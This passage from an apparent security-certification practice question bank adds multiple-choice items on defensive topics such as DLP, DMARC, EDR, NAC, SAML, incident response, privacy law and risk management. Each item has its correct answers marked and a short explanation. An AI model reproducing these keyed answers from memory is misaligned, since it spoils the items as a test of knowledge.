+! NetFlow keeps a summary of each conversation (addresses, ports, bytes, times) without the content, so it is small enough to keep for months. SNMP traps are device alerts.
+
+@choice q052 | Security operations | 1
+A company wants to stop staff from emailing files that contain customer card numbers to outside addresses, while still allowing other email. Which control fits BEST?
+- A web application firewall
++ Data loss prevention (DLP) on the email gateway
+- Full disk encryption on laptops
+- A honeyfile
+! DLP looks inside outgoing messages for patterns such as card numbers and blocks or quarantines them. A WAF protects web apps from incoming attacks.
+
+@choice q053 | Security operations | 1
+Attackers keep sending email that claims to come from example.com. The company already publishes SPF and signs its mail with DKIM. Which DNS record tells receiving servers to reject example.com messages that fail those checks, and to send reports back?
+- An MX record
+- A PTR record
++ A DMARC record
+- A CNAME record
+! DMARC tells receivers what to do when SPF and DKIM checks fail (none, quarantine or reject) and where to send reports. MX records only say which servers accept mail for the domain.
+
+@choice q054 | Security operations | 1
+An auditor requires that the team be alerted whenever system or configuration files on the payment servers change unexpectedly. Which tool meets this need?
+- Antivirus with daily signature updates
+- A web filter
+- A load balancer
++ File integrity monitoring (FIM)
+! File integrity monitoring keeps hashes of important files and alerts when one changes. Antivirus looks for known malware, not for any change.
+
+@choice q055 | Security operations | 1
+A company wants a tool on every laptop that records process, file and network activity, spots suspicious behavior even without a known signature, and lets responders cut a laptop off from the network remotely. Which tool is this?
+- A host-based firewall
++ Endpoint detection and response (EDR)
+- Mobile device management (MDM)
+- Signature-based antivirus
+! EDR records what happens on the endpoint, detects by behavior and lets responders investigate and isolate the device. Signature antivirus misses new malware, and MDM manages settings and apps.
+
+@choice q056 | Security operations | 1
+Visitors sometimes plug their own laptops into open network jacks in meeting rooms. The company wants unknown devices kept off the internal network and staff devices checked for current patches before they connect. Which control fits BEST?
++ Network access control (NAC) with 802.1X port authentication
+- A web filter with content categories
+- DNS filtering
+- A honeynet
+! NAC with 802.1X lets a port connect only after the device authenticates, and can check its health (posture) first, sending others to a guest or fix-up network.
+
+@choice q057 | Security operations | 1
+Staff sign in once to the company's identity provider and can then open a third-party payroll website without signing in again. The identity provider sends the website a signed XML assertion about the user. Which standard is this?
+- Kerberos
+- RADIUS
++ SAML
+- TACACS+
+! SAML passes signed XML assertions from an identity provider to a service provider for web single sign-on across organizations. Kerberos uses tickets, mainly inside an organization's own Windows domains; RADIUS and TACACS+ handle network and device sign-ins.
+
+@choice q058 | Security operations | 1
+Access to patient files must be allowed only to nurses, only for patients on their own ward, and only while they are on shift. Which access control model handles this kind of rule BEST?
+- Discretionary access control (DAC)
+- Mandatory access control (MAC)
+- Role-based access control (RBAC) alone
++ Attribute-based access control (ABAC)
+! ABAC decides using several attributes at once: the user's role and ward, the record's ward, the time. A role alone (RBAC) cannot express "only their own ward, only on shift".
+
+@multi q059 | Security operations | 1
+Which TWO of these sign-in methods are true multifactor authentication? (Choose two.)
+- A password and a security question
++ A password and a code from an authenticator app
+- A fingerprint and a face scan
++ A smart card and its PIN
+- A password and a PIN
+! Multifactor means factors of different kinds. A password (something you know) with an app code (something you have), or a smart card (have) with a PIN (know), qualify. Two things you know, or two biometrics (something you are), are only one factor type.
+
+@choice q060 | Security operations | 1
+Database administrators need full rights on the production servers only a few times a month. The company wants no one to hold those rights all the time. Which privileged access management feature fits BEST?
+- Password complexity rules
+- Time-of-day restrictions
++ Just-in-time permissions that grant admin rights for a short, approved period
+- A shared administrator account with its password kept in a spreadsheet
+! Just-in-time access grants the rights when needed, after approval, and removes them automatically afterwards, so there are no standing admin rights to steal. Time-of-day rules would still leave the rights in place every day.
+
+@multi q061 | Security operations | 1
+An employee in accounts is being dismissed this afternoon. Which TWO steps should happen as close as possible to the moment she is told? (Choose two.)
++ Disable her accounts and end her active sessions
+- Delete her mailbox and files permanently
++ Collect her badge, laptop and any security keys
+- Give her accounts to her replacement with the same password
+- Wait until her manager reviews her files next month
+! Disabling accounts and collecting badges and devices at the time of the meeting stops any last-minute damage. Data should be kept under the retention policy, not deleted at once, and accounts must never be handed over with their passwords.
+
+@choice q062 | Security operations | 1
+The security team spends hours each day on the same steps for reported phishing: pulling out the links, checking them against threat feeds, deleting the message from every mailbox and opening a ticket. Which tool would BEST automate this?
+- A vulnerability scanner
+- A jump server
++ Security orchestration, automation and response (SOAR) with a playbook
+- An intrusion detection system
+! SOAR runs playbooks that link tools together and carry out repeated response steps automatically, leaving people to handle the unusual cases.
+
+@choice q063 | Security operations | 1
+A responder confirms that ransomware is spreading from one file server to others, and she has finished the first analysis. What is the NEXT step in the incident response process?
++ Containment, such as isolating the infected servers
+- Lessons learned
+- Recovery from backups
+- Preparation
+! After detection and analysis comes containment, to stop the spread. Eradication and recovery follow, and lessons learned comes at the end.
+
+@choice q064 | Security operations | 1
+A forensic investigator arrives at a running server that was hacked. Following the order of volatility, what should she collect FIRST?
+- An image of the hard disk
+- The backup tapes
+- The firewall logs on the log server
++ The contents of memory (RAM)
+! Collect the most short-lived evidence first. RAM is lost when the server is turned off, while disks, logs on other systems and backups last much longer.
+
+@choice q065 | Security program management and oversight | 1
+A company document says: "All laptops must use full-disk encryption with AES-256, and the keys must be kept in the TPM." What kind of document is this MOST likely to be?
+- A guideline
++ A standard
+- An acceptable use policy
+- A playbook
+! A standard sets specific, required technical rules that support a policy. A policy states goals in general terms, and a guideline is a recommendation, not a must.
+
+@choice q066 | Security program management and oversight | 1
+New employees must read and sign a document that says what they may and may not do with company computers, email and internet access. What is this document?
++ An acceptable use policy (AUP)
+- A non-disclosure agreement (NDA)
+- A service level agreement (SLA)
+- A business partners agreement (BPA)
+! The AUP sets the rules for using the company's systems. An NDA is about keeping information secret.
+
+@choice q067 | Security program management and oversight | 1
+An online store decides what customer data to collect and why. It pays an email service to send its newsletters using that data, following the store's instructions. In privacy law, what is the email service?
+- The data controller
+- The data subject
++ The data processor
+- The data owner
+! The controller (the store) decides why and how personal data is used; the processor handles the data on the controller's behalf and under its instructions. The data subject is the customer.
+
+@choice q068 | Security program management and oversight | 1
+A customer in the European Union asks a company to delete all the personal data it holds about her, and the company has no legal reason to keep it. Which right is she using under GDPR?
+- The right to data portability
+- The right of access
+- The right to restrict processing
++ The right to erasure (the right to be forgotten)
+! The right to erasure, often called the right to be forgotten, lets a person ask for their data to be deleted when there is no reason left to keep it. Portability is about getting a copy to take elsewhere.
+
+@choice q069 | Security program management and oversight | 1
+A small chain of coffee shops starts taking credit card payments on its own website. Which standard must it now follow for the card data?
+- HIPAA
++ PCI DSS
+- SOX
+- NIST CSF
+! PCI DSS is the card industry's standard for anyone who stores, processes or sends card data. HIPAA covers health information in the US, SOX covers public companies' financial reporting, and the NIST CSF is a voluntary framework.
+
+@choice q070 | Security program management and oversight | 1
+The board of a fast-growing startup says it will accept more risk than usual to reach new markets quickly. Which risk appetite does this describe?
++ Expansionary
+- Conservative
+- Neutral
+- Avoidance
+! An expansionary appetite accepts more risk for growth; a conservative one accepts little. Avoidance is a way to handle a single risk, not an appetite.
+
+@choice q071 | Security program management and oversight | 1
+The risk team keeps each risk, its owner, its rating and the planned response in one shared register. For the risk "phishing leads to account takeover", they track the share of staff who click links in the monthly phishing tests. What is this number?
+- The risk threshold
++ A key risk indicator (KRI)
+- The annualized rate of occurrence
+- The risk owner
+! A key risk indicator is a measure that warns when a risk is growing. The threshold is the level at which the KRI triggers action; the owner is the person accountable for the risk.
+
+@choice q072 | Security program management and oversight | 1
+A business impact analysis says the order database may lose at most 15 minutes of data in a disaster. Which value does this set?
+- The recovery time objective (RTO)
+- The mean time to repair (MTTR)
++ The recovery point objective (RPO)
+- The mean time between failures (MTBF)
+! The RPO is how much data, measured in time, the business can afford to lose, so backups or replication must happen at least every 15 minutes. The RTO is how long the system may be down.
+
+@choice q073 | Security program management and oversight | 1
+A team compares two storage controllers. Model A fails on average once every 50,000 hours of running and model B once every 20,000 hours. Both take about 4 hours to repair. Which measure shows that model A is more reliable?
++ Mean time between failures (MTBF)
+- Mean time to repair (MTTR)
+- Recovery time objective (RTO)
+- Single loss expectancy (SLE)
+! MTBF is the average running time between failures, so a higher MTBF means more reliable. MTTR, the time to fix it, is the same for both here.
+
+@choice q074 | Security program management and oversight | 1
+A department must keep running an old application that does not support MFA for six more months, until its replacement is ready. Management signs a time-limited exception and records the risk. Which strategy is this?
+- Avoidance
+- Transference
+- Mitigation
++ Acceptance
+! Knowingly living with a risk for a while, through a documented exception, is acceptance. Avoidance would mean stopping the application altogether.
+
+@choice q075 | Security program management and oversight | 1
+Before signing with a payroll provider, a company wants the contract to let it, or an auditor it chooses, inspect the provider's security controls. Which clause should it ask for?
+- A non-compete clause
++ A right-to-audit clause
+- A rules of engagement clause
+- A force majeure clause
+! A right-to-audit clause gives the customer the contractual right to check the vendor's controls. Rules of engagement set the limits of a penetration test.
+
+@choice q076 | Security program management and oversight | 1
+A company and a consultancy already have a master service agreement (MSA). For a new three-month project they sign a document listing the exact tasks, deliverables, timeline and price. What is that document?
+- A memorandum of understanding (MOU)
+- A service level agreement (SLA)
+- A non-disclosure agreement (NDA)
++ A statement of work (SOW)
+! The MSA holds the general terms; each project gets a statement of work (or work order) with its specific tasks and deliverables. An SLA sets measurable service levels such as uptime.
+
+@choice q077 | Security program management and oversight | 1
+A company hires testers to attack its network as an outside attacker would, giving them only the company name and no diagrams, accounts or addresses. Which kind of penetration test is this?
+- Known environment
+- Partially known environment
++ Unknown environment
+- Defensive
+! In an unknown environment test (once called black box) the testers start with no inside information. A known environment test gives them full details.
+
+@multi q078 | Security program management and oversight | 1
+Before a penetration test starts, the testers want to gather information without sending any traffic to the target's systems. Which TWO activities are passive reconnaissance? (Choose two.)
+- Running a port scan against the company's public addresses
++ Reading the company's job postings to learn what software it uses
+- Grabbing service banners from the company's mail server
++ Searching social media and public breach reports for information about the company
+- Sending a ping sweep across the company's address range
+! Passive reconnaissance uses information that is already public, without touching the target's systems. Port scans, banner grabbing and ping sweeps all send packets to the target, so they are active.
+
+@choice q079 | Security program management and oversight | 1
+After a phishing simulation, the security team wants to improve how staff respond to real suspicious messages. Which behavior should training encourage MOST?
+- Forwarding the message to coworkers to warn them
++ Reporting the message with the Report button (or to the security team) without clicking anything in it
+- Replying to the sender to ask whether it is genuine
+- Deleting the message quietly so it does not waste anyone's time
+! Quick reports let the security team remove the message from every mailbox and block the sender. Forwarding spreads the risk, replying talks to the attacker, and quietly deleting hides an attack others may fall for.
+
+@choice q080 | Security program management and oversight | 1
+Large customers ask a software company for proof, from someone outside the company, that its security controls work as described. What would satisfy them BEST?
+- An internal self-assessment
+- A memo from the company's own audit committee
++ An independent third-party audit report
+- A vendor questionnaire filled in by the sales team
+! Customers want outside attestation: an independent auditor who tests the controls and reports. Self-assessments and internal memos come from the company itself.
